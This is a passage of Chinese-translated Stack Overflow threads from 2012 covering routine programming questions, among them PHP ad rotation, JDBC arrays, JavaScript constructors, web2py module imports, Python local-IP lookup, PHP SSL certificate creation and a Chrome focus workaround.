当然，也可以在源代码之间放置图像。大多数官方 Java 演示（例如[这里](http://docs.oracle.com/javase/tutorial/uiswing/examples/components/index.html)）都是这样做的。它更紧凑。不过，我不会将这种技术用于大型项目。它会变得非常混乱。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-13T10:55:14.470

尝试按照其他人的建议将您的图像放入第二个文件夹，例如 /res 然后使用代码：

`setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("path/to/icon.png")));`
我为我的应用程序尝试了这个，并且每次都有效。另外，尽量不要将图像放入包中。

# php - 仅向 20% 的访问者展示广告。或向另外 80% 的访问者投放不同的广告

> ID：11735773
> 
> 赞同：-1
> 
> 时间：2012-07-31T08:10:05.797
> 
> 标签：php, visitors

如何在 PHP 文件中仅向 20% 的访问者展示广告？或者向另外 80% 的访问者展示不同的广告？

任何可行的方法，可能使用时间间隔，例如仅在 0-12 分钟访问该站点的访问者显示它，而在 13-59 分钟访问该站点的访问者则不是，或者其他方法将起作用。

如果你有，请帮助或分享，这应该很容易，很多人应该需要它，已经用谷歌搜索但仍然找不到

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T08:13:45.083

我会简单地使用一个随机数：

```
if (rand(0, 100) <= 20)
{
  ShowAd(1);
} else {
  ShowAd(2);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:15:40.283

尝试搜索 SO？

```
$adPercent = 20;
if (rand(0, 100) < $adPercent) {
   echo '<div class="ads">Buy now!</div>';
} 
```

从这里得到这个：

[向 % 的用户展示广告](https://stackoverflow.com/questions/7031452/display-ads-to-of-users)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:13:26.663

使用随机数生成器的一种可能的简单解决方案：

```
$randInteger = rand(1, 10); // Generate a random number in variable $randInteger.
if ($randInteger <= 2) // If the integer is 1 or 2, show the 20% ad.
{
    showTwentyPercentAd();
}
else if ($randInteger >= 3) // Otherwise, if the integer is 3-10, show the 80% ad.
{
    showEightyPercentAd();
} 
```

希望这清楚代码的结构。

# vb.net - 尝试选择已选择的项目时触发 vb.net Listview selectedItemChanged 事件

> ID：11735776
> 
> 赞同：0
> 
> 时间：2012-07-31T08:10:17.027
> 
> 标签：vb.net, listview

任何人都知道可能会出现什么问题？在我在将属性与列表视图中的项目关联的网格中进行一些更改后，会发生这种行为，选择不同的项目，在保存提示下我取消并恢复选择，现在如果我尝试选择已选择的项目事件会触发。我不知道为什么。

如果我在保存提示中取消，我会在恢复选择时以编程方式更改选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:48:58.880

我设法重现了这个问题。如果将 MultiSelect 属性设置为 false，则会解决此问题。但是，如果您需要多项选择，则需要另一种解决方案。

处理 SelectedItemChanged 事件并且仅在项目不同时响应的 ListView 周围的 UserControl“包装器”是一个选项。

# java - getArray 上的 SQLFeatureNotSupportedException

> ID：11735786
> 
> 赞同：1
> 
> 时间：2012-07-31T08:10:52.680
> 
> 标签：java, mysql, jdbc

使用 MySQL 5.5、STS 2.9.2、mysql-connector-java-5.1.21-bin.jar

我想从 ResultSet 中获取一个数组。

所以我这样编码：

```
try {
  Connection conn = DriverManager.getConnection(url, id, pass);
  Statement stmt = conn.createStatement();
  ResultSet rs = stmt.executeQuery(query); 

  if (rs.next()) {
    Array code = rs.getArray("code");
    Array count = rs.getArray("count");         

    Object objCode = code.getArray();
    Object objCount = count.getArray();

    int[] itemCode = (int[]) objCode;
    int[] itemCount = (int[]) objCount;

    // do something     
  } 

  conn.close();
  stmt.close();
  rs.close();           
} catch(SQLException e) { 
  printError(e);
} 
```

然后，我得到了一个`SQLFeatureNotSupportedException`at `getArray()`。

如果我删除该行，它不会给出该异常。

我google了一下，发现是因为JDBC驱动不支持这种方法。我无法理解它所说的内容，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-05T13:51:24.073

.getArray 方法获取 ARRAY SQL 数据类型。像这样： .getDecimal 获取 DECIMAL SQL 数据类型等等...... MySQL（例如）不支持 ARRAY 数据类型。因此，Java 报告：不支持该功能。

如果要将所有字段作为索引数组获取，请使用 .getString(1) 获取索引 1 处的 VARCHAR 列值。

示例查询：SELECT id,title FROM news WHERE id = 1;

因此，您可以使用 .getInt(1) 获取 id，并使用 .getString(2) 获取标题。

这就是我能说的全部））

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-07-23T09:18:27.363

`getArray("columnName")`或`getArray("columnIndex")`MySql 数据库服务器不支持方法。

# ruby-on-rails - Rails - 显示内联导轨错误

> ID：11735790
> 
> 赞同：0
> 
> 时间：2012-07-31T08:11:00.410
> 
> 标签：ruby-on-rails, validation

如何将我的代码压缩成一条语句：

```
<% @policyholderdetail.errors.each do |attr,msg| %>
  <% if attr == :title %>
    <li><%=attr %> <%= msg %></li>
  <% end %>
<% end %> 
```

我只想`:title`在字段旁边显示错误，但我觉得应该有更好的语句来执行此操作，而不是循环遍历所有错误，直到找到我想要的错误。

问题 - 我可以将前两行浓缩成一个更好的陈述吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:22:32.307

你可以写： `@policyholderdetail.errors[:title]`。见[这里](http://guides.rubyonrails.org/active_record_validations_callbacks.html#working-with-validation-errors)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:23:13.383

利用

```
 <% if @policyholderdetail.errors[:title].present? %> 
```

# qt - QTreeview 与我的模型如何实现复制粘贴操作

> ID：11735791
> 
> 赞同：1
> 
> 时间：2012-07-31T08:11:12.023
> 
> 标签：qt, copy-paste, qtreeview

我想在我的 QTreeView 中针对我的上下文菜单复制和粘贴实现复制和粘贴操作，我有子类 QAbstractItemModel。我有 Treeview 说四个 Tope 级别的项目，每个项目都有多个孩子

```
Top Item1

----------

     Child1
           Child11
                 Child111

Top Item2

----------

Top Item3 
```

我想右键单击项目“child1”并将 child1 及其所有子项复制到 child111，然后右键单击并粘贴到“Top Item3”上，以便从 child1 到 child111 的所有项目都复制到 Top Item3 下。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:50:40.657

按下复制后，您应该存储指向 Child1 的指针。粘贴到 Top Item Tree3 后，在其中创建新子项并将 Child1 的内容复制到新子项。这应该递归地完成。

# javascript - Javascript：在函数中声明变量的两种方式的区别

> ID：11735794
> 
> 赞同：3
> 
> 时间：2012-07-31T08:11:25.453
> 
> 标签：javascript

我想创建一个对象。而且，在我读过的几乎代码中，他们经常使用这种风格：

```
function student(_id, _name, _year){
   this.id = _id;
   this.name = _name;
   this.year = _year;
} 
```

但是，我不知道下面的代码有什么区别：

```
function student (_id, _name, _year){
   var id = _id;
   var name = _name;
   var year = _year;
} 
```

例如，我已经测试了`alert`要筛选的属性，并没有发现任何区别。

谢谢 ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:15:08.743

当您使用**var**声明变量时，它们仅在函数/构造函数的范围内可见。可以这么说，它们是私人的。

在这种情况下，使用**this与构造函数密切相关。**当您实例化一个学生时，分配给它的所有值都将是公开可访问的。

首先，我建议将您的**学生**重命名为**Student**并使用大写**字母 S**。这是一个约定，表明它是一个构造函数，您需要使用**new**关键字。

```
function Student(id, name, year){
   this.id = id;
   this.name = name;
   this.year = year;
} 
```

如果您现在实例化 Student，您可以访问这些值...

```
var student = new Student(1, "Name", 2012);
console.log(student.year); // => 2012 
```

使用 var 时不能...

```
function Student (id, name, year){
   var id = id;
   var name = name;
   var year = year;
}

var student = new Student(1, "Name", 2012);
console.log(student.year); // => undefined 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:13:56.897

不同之处在于属性在第一个是公共的，而在第二个是私有的。

带或不带下划线的前导 var 没有区别。第二个示例与参数不匹配。`id`与`_id`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-31T08:15:04.043

```
function student(_id, _name, _year){
   this.id = _id;
   this.name = _name;
   this.year = _year;
}
var s1 = new student(1, 'mike', 20);
console.log(s1.name); // give you mike

function student(_id, _name, _year){
   var id = _id;
   var name = _name;
   var year = _year;
}

var s1 = new student(1, 'mike', 20);
console.log(s1.name); // give you undefined 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-31T08:17:00.170

它关于变量的范围。

在您的第一个示例中，您将 id、name 和 year 分配为学生的外部可访问属性。例如：

```
student.id, student.name, student.year 
```

但是，在第二个示例中，这些变量仅在学生函数*内具有作用域。*您无法从外部访问它们的值。

# c# - 在 Entity Framework 中使用查找表

> ID：11735797
> 
> 赞同：1
> 
> 时间：2012-07-31T08:11:42.087
> 
> 标签：c#, .net, entity-framework, entity-framework-4, lookup-tables

我不得不在 EF 项目中使用查找表，我花了一些时间才让它工作，但我不确定如何查询某些内容。

如果我有三个表（这是一个说明问题的测试项目）：

```
Person
------
ID - Int - PK
PersonName - varchar[50] 
```

和

```
Skill
-----
ID - Int - PK
SkillName - varchar[50] 
```

通过查找表链接：

```
PS_Lookup
---------
ID - Int - PK
PersonID - Int - FK : Person.ID
SkillID - Int - FK : Skill.ID 
```

现在，如果我想返回所有拥有 ID 1 技能的用户，我可以这样做：

```
var result = (from p in context.People                          
              select new
              {
                  PersonID = p.ID,
                  PersonName = p.PersonName,
                  FirstSkill = (from s in p.PS_Lookup 
                                where s.ID == 1
                                select s.SkillName),                              
              }).ToList(); 
```

我的问题是，我需要对上述查询进行哪些更改才能返回具有 ID 1 技能的每个人的 PersonName 和 PersonID？即不返回“FirstSkill”。我不需要名称，因为我知道 FirstSkill 是什么，而且我看不出我与该`where`子句有什么关系。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:16:39.903

您需要在查询中使用 where 条件：

```
var result = (from p in context.People
              where p.PS_Lookup.Any(ps => ps.ID == 1)
              select new { p.ID, p.PersonName })
             .ToList(); 
```

# python - web2py 无法识别模块目录中的模块

> ID：11735802
> 
> 赞同：3
> 
> 时间：2012-07-31T08:12:29.710
> 
> 标签：python, web2py

我将一个模块复制到 web2py 中应用程序的“模块”文件夹中。当我尝试在任何控制器内的任何函数中导入模块时，我收到以下错误：

```
<type 'exceptions.ImportError'> No module named module_name 
```

无论使用任何模块，我都会收到该错误。但是，如果我将相同的模块复制到“站点包”并导入它，它就可以完美运行。

我发现“sys.path”不包含模块文件夹，但包含“站点包”文件夹。

如何将模块文件夹添加到特定于 web2py 的“sys.path”，或者有没有其他方法可以解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-09T04:02:23.787

终于找到了解决我的问题的方法。

似乎为了使用 导入模块目录中的模块`import module_name`，应用程序的名称必须全部小写。

以前，我的应用程序的名称是`projectX`，但是当我将其更改为应有`projectx`的`import module_name`工作时。

我还发现，无论应用程序名称如何，在导入模块时显式声明应用程序名称也有效。`import applications.projectX.modules.module_name`当应用程序的名称为`projectX`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:31:19.167

您是否已经尝试使用本地导入？

像这样的东西：

```
twitter = local_import('twitter') 
```

其中 twitter 是我保存在 modules 文件夹中的模块的名称。

干杯

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T21:17:23.990

它应该完全按照您的预期工作，并且对我有用。无需更改 sys.path。web2py 负责这个。它期望在该目录中找到模块。什么版本的 web2py？你是从源头运行的吗？（它下载源代码分发并将其作为 python web2py 启动，或者您是否使用预编译的二进制分发？）当您说“在控制器内的任何函数中导入该模块”时，您到底想做什么？对我来说，在我的默认控制器顶部或模型中的简单导入适用于当前稳定版本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-06-23T20:25:04.020

这是允许 PyCharm 为我解析引用的导入格式：

```
import applications.dashboard.modules.user_info as user_info 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-07-21T05:16:32.480

我为此找到的解决方法是确保应用程序是一个包。

例如，如果您有 foo 应用程序并且您的树看起来像这样：

```
applications
├── __init__.py      <----- This file is probably missing
├── yourapplication
│   └── modules
│       ├── ...
├── ... 
```

# android - 为什么我们需要在 AIDL 文件中声明 parcelable 对象？

> ID：11735809
> 
> 赞同：1
> 
> 时间：2012-07-31T08:12:43.703
> 
> 标签：android

如果我们有一个类想通过 IPC 接口从一个进程发送到另一个进程，我们必须创建一个支持 Parcelable 协议的类（实现 Parcelable）。

**此外，我们必须创建一个 .aidl 文件来声明该 parcelable 类。由于这个 .aidl 文件不会像往常一样生成 .java 文件，我想知道为什么我们需要这样做。**

# iphone - isEqualToString 故障

> ID：11735812
> 
> 赞同：1
> 
> 时间：2012-07-31T08:12:49.397
> 
> 标签：iphone, objective-c, ios

好的，我有两个包含数字的字符串，如下所示使用调试器：

**字符串 1**

```
(gdb) po [event creator_id]
123456789
(gdb) p [event creator_id]
$1 = (NSString *) 0xad81d10 
```

**字符串 2**

```
(gdb) po [delegate userid]
123456789
(gdb) p [delegate userid]
$2 = (NSString *) 0x7451b40 
```

现在我想检查它们是否彼此相等，这就是问题所在。

下面的 if 语句由于某种原因不会返回 true：

```
if ([[delegate userid] isEqualToString: [event creator_id]]) {

    NSLog(@"They are equal!");

} 
```

有人可以向我解释这是怎么发生的吗？感谢您的时间！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:34:45.353

这可能是因为以下任何一个都是 FALSE

```
[[delegate userid] isKindOfClass:[NSString class]]

[[event creator_id] isKindOfClass:[NSString class]] 
```

po 是“打印对象”，它打印对象的描述（它是字符串）。description 属性在 NSObject 级别可用。

希望它可以帮助你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:58:15.703

许多方法返回一个`id`可以分配给任何`NSObject`指针而不会产生编译器错误或警告的方法。并且 gdb "p" 命令只使用从源代码生成的类型信息，并不能确定运行时的实际类。

例子：

```
NSString *s;
s = [NSArray arrayWithObject:@"Hello World"]; 
```

在调试器中：

```
(gdb) po s
<__NSArrayI 0x8ec70a0>(
Hello World
)

(gdb) p s
$1 = (NSString *) 0x8ec70a0 
```

所以“po”知道实际的类，但“p”不知道。

# asp.net - 使用 web.config 转换在根元素上设置多个属性

> ID：11735815
> 
> 赞同：9
> 
> 时间：2012-07-31T08:12:54.997
> 
> 标签：asp.net, .net, web-config, web-deployment, web-config-transform

在 Visual Studio（web.config 转换）中，我有一个要执行的转换，它在根元素上添加两个属性。一种属性有效（但不是多种属性）。我可以在一个子元素上设置多个属性。我试过 SetAttributes 有和没有指定属性的名称，没有运气。

想法？？

**例子**

```
 <element xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform" xdt:Transform="SetAttributes" attrOne="One" attrTwo="Two">
      <children>
       <child name="One" xdt:Transform="SetAttributes" attrOne="One" attrTwo="Two" />
      </children>
    </element> 
```

**想要的效果**

```
 <element attrOne="One" attrTwo="Two">
      <children>
       <child name="One" attrOne="One" attrTwo="Two" />
      </children>
    </element> 
```

“元素”部分实际上是 web.config 文件的自定义部分......就像这样：

```
<configuration>

... <element configSource="App_Data\element.config" /> 
```

此转换旨在用于 element.config 文件（使用慢 cheetah）

**更新** 这显然也不起作用：

```
<element xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform" xdt:Transform="Replace" attrOne="One" attrTwo="Two">
  <children>
   <child name="One" attrOne="One" attrTwo="Two" />
  </children>
</element> 
```

但这确实：

```
<element xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform" xdt:Transform="Replace" attrOne="One">
  <children>
   <child name="One" attrOne="One" attrTwo="Two" />
  </children>
</element> 
```

只要根元素上有超过 1 个属性，它就会失败

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2016-11-10T12:35:44.233

您是否尝试过像这样通过将属性列表传递给 set to 来同时设置多个属性的文档转换`SetAttribute()`？

请参阅[此处](https://msdn.microsoft.com/en-us/library/dd465326(v=vs.110).aspx)形成更多信息。

具体来说：*Transform="SetAttributes(一个或多个属性名称的逗号分隔列表)"*

```
<element xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform" xdt:Transform="SetAttributes(attrOne,attrTwo)" attrOne="One" attrTwo="Two">
  <children>
   <child name="One" xdt:Transform="SetAttributes(attrOne,attrTwo)" attrOne="One" attrTwo="Two" />
  </children>
</element> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:29:40.937

The document element of a `web.config` file is `<configuration>`. In your example, `<element>` is probably a child of `<configuration>`. Try:

```
<configuration xmlns:xdt="http://schemas.microsoft.com/XML-Document-Transform">
    <element xdt:Transform="SetAttributes" attrOne="One" attrTwo="Two">
        <children>
            <child xdt:Transform="SetAttributes" name="One"
                   attrOne="One" attrTwo="Two" />
        </children>
    </element>
</configuration> 
```

# java - 远程数据库访问架构

> ID：11735816
> 
> 赞同：0
> 
> 时间：2012-07-31T08:12:59.207
> 
> 标签：java, spring, jakarta-ee, architecture

再会。我正在开发一个带有数据库的网站，该数据库将使用 Spring/Hibernate 包托管在云中。我还需要开发一个能够管理远程数据库的桌面应用程序。我一直在选择适当的方法来实现远程访问。JAX-WS、RMI、Spring HttpInvoker 或任何其他方法？我应该选择哪个，为什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:46:12.923

我会为这个特定任务选择 JAX-WS/SOAP。

与 RMI 等二进制协议不同，它可以轻松通过公司代理和防火墙。它具有安全机制（WS-Security）、事务和会话支持，我认为这对数据库远程管理很重要。

它还具有比任何其他远程访问方法/API/框架更好的工具/IDE 支持。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:14:16.003

在 dao 层之上创建一个服务层，并使其成为 WS。从您的 Web 应用程序和桌面应用程序调用 WS 以使用您的数据库操作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T12:26:14.697

尽管我的前辈们给出了宝贵的答案，但我希望您分析一下您正在构建的系统有多复杂，以及该系统将拥有多少不同环境的客户。我的意思是，如果有其他应用程序，使用与 Java 不同的技术编写的话。如果是这样，最好的解决方案是 JAX-WS。Web 服务是标准化的，可以在各种环境中使用，而不仅仅是 Java EE。但是，如果您要构建一些仅由您的应用程序使用的特定系统，那么 RMI 就足够了。

# python - Python - 获取本地主机 IP

> ID：11735821
> 
> 赞同：13
> 
> 时间：2012-07-31T08:13:04.937
> 
> 标签：python, sockets, ip-address

> **可能重复：**
> [使用 Python 的 stdlib 查找本地 IP 地址](https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib)

要获取我的本地主机 IP 地址，我会这样做`socket.gethostbyname(socket.gethostname())`。但它给了我答案`127.0.0.1`。如果我这样做，`an_existing_socket.getsockname()[0]`我会得到答案`0.0.0.0`。

我需要我的“真实”IP 地址（例如 192.168.xx）来修改配置文件。我怎么能得到它？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-07-31T08:18:54.150

我一般使用这段代码：

```
import os
import socket

if os.name != "nt":
    import fcntl
    import struct

    def get_interface_ip(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s',
                                ifname[:15]))[20:24])

def get_lan_ip():
    ip = socket.gethostbyname(socket.gethostname())
    if ip.startswith("127.") and os.name != "nt":
        interfaces = [
            "eth0",
            "eth1",
            "eth2",
            "wlan0",
            "wlan1",
            "wifi0",
            "ath0",
            "ath1",
            "ppp0",
            ]
        for ifname in interfaces:
            try:
                ip = get_interface_ip(ifname)
                break
            except IOError:
                pass
    return ip 
```

我不知道它的起源，但它适用于 Linux/Windows。

**编辑：**

[smerlin](https://stackoverflow.com/users/231717/smerlin)在[此](https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib)stackoverflow 问题中[使用](https://stackoverflow.com/a/1947766/142637)此代码。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-07-31T08:50:53.357

您可以使用一个漂亮的模块。它被称为netifaces。只需在 virtualenv 中执行 pip install netifaces 进行测试，然后尝试以下代码：

```
import netifaces

interfaces = netifaces.interfaces()
for i in interfaces:
    if i == 'lo':
        continue
    iface = netifaces.ifaddresses(i).get(netifaces.AF_INET)
    if iface != None:
        for j in iface:
            print j['addr'] 
```

这一切都取决于你的环境。如果您只有一个带有一个 IP 地址的接口，您可以简单地执行以下操作：

```
netifaces.ifaddresses('eth0')[netifaces.AF_INET][0]['addr'] 
```

如果您在 NAT 后面并且想知道您的公共 IP 地址，您可以使用类似的东西：

```
import urllib2

ret = urllib2.urlopen('https://icanhazip.com/')
print ret.read() 
```

希望这可以帮助。

# delphi - 当邮件服务器没有 smtp 但只有 ip 时如何使用 TidSMTP

> ID：11735832
> 
> 赞同：0
> 
> 时间：2012-07-31T08:13:57.897
> 
> 标签：delphi, indy, indy10

`idSMTP`我开发了一个使用 indy ( + SSL)发送电子邮件的应用程序。我向用户公开的`idSMTP`属性很简单：

主持人

用户

密码

无论如何，在某些情况下，用户有一个没有 smtp 地址的内部邮件发件人，而只是一个内部 IP（如 192.168.48.63），没有用户也没有密码。

我试图设置 host = id 但它不起作用。

你能提出一个解决方案吗？

# certificate - 开源证书颁发机构软件

> ID：11735833
> 
> 赞同：3
> 
> 时间：2012-07-31T08:13:58.757
> 
> 标签：certificate, ssl-certificate, x509certificate

我正在寻找证书颁发机构软件的开源实现，我想在其中生成根 CA 证书并将其安装在我的客户端计算机上，并为我的本地网站生成 SSL 证书并将其安装在网络服务器上。

我相信，如果我在我的客户端机器上安装根 CA 证书，浏览器不会向我显示证书错误......是吗？

我找到了这个 wiki 节点[http://en.wikipedia.org/wiki/Certificate_authority](http://en.wikipedia.org/wiki/Certificate_authority) ，他们有一个开源软件列表：EJBCA、OpenCA、OpenSSL、gnoMint、DogTag、XCA、r509。

我不确定哪一个对我来说是一个不错的选择，如果有人对此有任何经验，请与我们分享。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-20T21:48:41.340

关于浏览器抱怨证书，您是对的。如果您将根 CA 证书安装到受信任的证书存储中，并且服务器证书将由该根 CA 签名，您将不会再看到错误消息。

我认为出于您的目的，OpenSSL 是您所需要的。您应该能够在几个命令中创建所有必要的证书。

# javascript - Chrome 错误解决方法：Javascript 窃取焦点

> ID：11735834
> 
> 赞同：2
> 
> 时间：2012-07-31T08:13:59.217
> 
> 标签：javascript, google-chrome, focus

当我启动 Chrome 时，新窗口显示为未聚焦且位于其他窗口后面。所以我决定创建一个解决方法；我将使用我磁盘中的一个文件更改我的主页 url，该文件包含用于窃取焦点的 javascript，然后重定向到真正的主页。

使用 javascript 窃取焦点的最佳方法是什么？

更新：这是我尝试的...

```
 <html>
     <head></head>
     <body></body>
  </html>

  <script type="text/javascript">

       myWindow=window.open("http://google.com", "_blank", 
          "resizable=yes, scrollbars=yes, titlebar=yes" );
       myWindow.focus();
       self.close();

   </script> 
```

但是新窗口看起来像弹出窗口，Chrome 不显示工具栏和地址栏不可编辑:(

* * *

有关该错误的更多信息： http://productforums.google.com/forum/#!topic/chrome/ [zyLC4Ip96pU](http://productforums.google.com/forum/#!topic/chrome/zyLC4Ip96pU)

> 据我所知，这仅从最新更新开始。如果 Chrome 已打开，当我从 Windows 工具栏的快速启动区域中的快捷方式打开 Chrome 的新窗口时，新窗口不会获得焦点，焦点仍保留在前一个 Chrome 窗口上。如果在我启动快捷方式时焦点不在上一个 Chrome 窗口上，它可以正常工作

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:16:14.943

[http://www.w3schools.com/jsref/met_win_focus.asp](http://www.w3schools.com/jsref/met_win_focus.asp)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-11-05T20:06:09.397

我刚刚发布了一个旨在解决此错误的小型 Chrome 扩展程序！到目前为止，它对我来说效果很好（在 Window 7 64 位上）。你可以在这里找到它：[https ://chrome.google.com/webstore/detail/chrome-new-window-focus/opmhcfhkhiodgapmnaolhmekmfihmecp](https://chrome.google.com/webstore/detail/chrome-new-window-focus/opmhcfhkhiodgapmnaolhmekmfihmecp)

如果您遇到任何问题，请告诉我！

干杯，
尤维

# android - 短信正文没有改变其意图的文本

> ID：11735841
> 
> 赞同：3
> 
> 时间：2012-07-31T08:14:44.497
> 
> 标签：android, android-layout, android-intent

我正在开发应用程序，我正在使用`intent`启动短信活动。我设置了`sms_body`of `intent`，过了一会儿我也更改了 and 的文本，`sms_body`但是`recepients`现在当我启动 sms 活动时，它会显示旧文本和旧收件人。

我什至清理了项目。我也调试，值设置正确，但在活动启动时它显示旧文本和收件人。

编辑：

当我执行以下代码时：

```
 Intent intent = new Intent(Intent.ACTION_VIEW); 
                    String primaryandsecondaryNumbers=PrimaryNumber+";"+SecondaryNumber;

                    String messageBody="MY MESSAGE";
                   intent.putExtra("address", primaryandsecondaryNumbers);
                  intent.putExtra("sms_body", messageBody);
                  intent.setData(Uri.parse("smsto:" + primaryandsecondaryNumbers));
                  intent.setType("vnd.android-dir/mms-sms");
                  startActivity(intent); 
```

我的 messageBody 未更新，但已设置接收号码。

当我评论时：

```
 intent.putExtra("address", primaryandsecondaryNumbers); 
```

我的消息已更新，但我的号码不可见

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T11:59:31.817

发生这种情况是因为为收件人保存了草稿。如果您更改收件人并且他不存在草稿，那么它会设置新消息。如果您删除将起作用的草稿。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-14T18:34:10.837

我在 HTC Sensation 上遇到了这个问题。构建意图并正确更新所有内容的唯一方法是使用以下方法：

```
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.putExtra("address", "123456");
intent.putExtra("sms_body", "Message Body");
intent.setData(Uri.parse("smsto:123456")); //yes, you need the number twice
activity.startActivity(intent); 
```

# php - PHP , MySQL 和 SSL 认证

> ID：11735842
> 
> 赞同：0
> 
> 时间：2012-07-31T08:14:52.047
> 
> 标签：php, security, ssl

我有一个关于使用 SSL 证书构建身份验证系统的问题。我的想法是将数据存储在数据库中（我知道该怎么做），当用户提供证书时，系统会检查证书值并知道将用户放在哪里。但是有些事情不是很清楚（我可能听起来很笨，但不要评判我）

1.  如何用PHP制作证书？
2.  如何使系统向客户端请求特定的详细信息？（与 StartSSL 一样）
3.  我必须签署私人证书吗？

PS：如果这有什么不同，我正在使用 HostGator 商业计划。我已要求他们颁发私人 ssl 证书。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:29:18.847

我从未使用过 StartSSL，但是现在许多个人和公司都使用 SSL API 和身份验证，例如新的（ish）Facebook sdk。

**请注意**，许多浏览器和其他软件不支持将自签名证书作为有效的安全机制。

您不能在 PHP 中制作 SSL 证书，而是必须使用 OpenSSL 等工具制作。这是我在 Google 上找到的简短教程：[http](http://www.akadia.com/services/ssh_test_certificate.html) ://www.akadia.com/services/ssh_test_certificate.html 。

SSL 主要旨在使跨线路的数据传输更加安全，并且在通过 PHP 读取连接时，您将验证证书以查看它是否与应有的证书匹配（http://stackoverflow.com/questions /3081042/how-to-get-ssl-certificate-info-with-curl-in-php）很像浏览器如何下载站点 SSL 证书，然后使用它来创建安全连接。我不会想象您会为每个用户提供一个证书。

在此之后，您的所有数据都通过 HTTPS 而不是允许 SSL 身份验证的 HTTP。

根据 SSL 身份验证系统，如果它是 API，那么您的 cURL 请求将通过 HTTPS 而不是 HTTP 发送。

如果您正在为网站上的登录页面制作此内容，那么它比我上面所说的要简单得多（理论上，您仍然可以搞砸很多事情）。如果您这样做，那么您只需将 SSL 证书添加到您的服务器，然后将其添加到您的服务器配置（Google 的另一个 Apache 快速教程：[http ://www.digicert.com/ssl-certificate-installation-apache .htm](http://www.digicert.com/ssl-certificate-installation-apache.htm)），然后像往常一样将用户重定向到登录页面的 https 和登录处理页面（确保你有一个`vhost`for`443`如果你在 Apache 中）。

编辑：Openssl 确实有一个 PHP API，因为我刚刚记得所以我错了。

这就是我看到 SSL 身份验证失败的方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:08:01.603

1) 使用 PHP 创建新 SSL 证书的方法^

```
 $dn = array(
        "countryName" => 'Country',
        "organizationName" => 'Org',
        "commonName" => 'Common name',
        "emailAddress" => 'email@email.com',
    );

    $configArgs = array(
        'digest_alg' => 'SHA1',
    );

    $clientKey = openssl_pkey_new();
    $csr = openssl_csr_new($dn, $clientKey, $configArgs);

    $password = trim(base64_encode(openssl_random_pseudo_bytes(8)), '/=');

    $cert = openssl_csr_sign(
        $csr,
        'file:///etc/ssl/ca/ca.pem',
        'file:///etc/ssl/ca/ca.pem',
        1095,
        $configArgs,
        $serial
    );

    openssl_pkcs12_export($cert, $clientCertPkcs12, $clientKey, $password);
    openssl_x509_free($cert);
    $sslData = array(
        'serial' => $serial, // random serial
        'sslkey' => $password,
        'created_at' => time(),
        'sslpfx' => $clientCertPkcs12
    );

    openssl_pkey_free($clientKey); 
```

# text - AppleScript 返回带有奇怪字符的文本

> ID：11735844
> 
> 赞同：1
> 
> 时间：2012-07-31T08:14:54.893
> 
> 标签：text, applescript, character

我有一个脚本可以返回部分文本文件，但我注意到它有时会返回直接查看文本文件时不可见的字符。例如，这个词：

```
breeders 
```

变成

```
breedÂ¬â rs 
```

我尝试在我的文本返回中添加“作为 Unicode 文本”，但这不起作用。想法？这是我的脚本：

```
set some_file to "[...]Words.txt" as alias
set the_text to read some_file as string
set the text item delimiters of AppleScript to ", "
set the_lines to (every text item of the_text)
return some item of the_lines as Unicode text 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T09:52:55.203

您是否尝试过`ruby -KU -e '"breeders".chars{|c|puts c.unpack("U*")[0].to_s(16)}'`或搜索无法在 Character Viewer 中正确显示的字符？

`read`除非您添加`as «class utf8»`：

```
do shell script "echo ä > /tmp/test.txt"
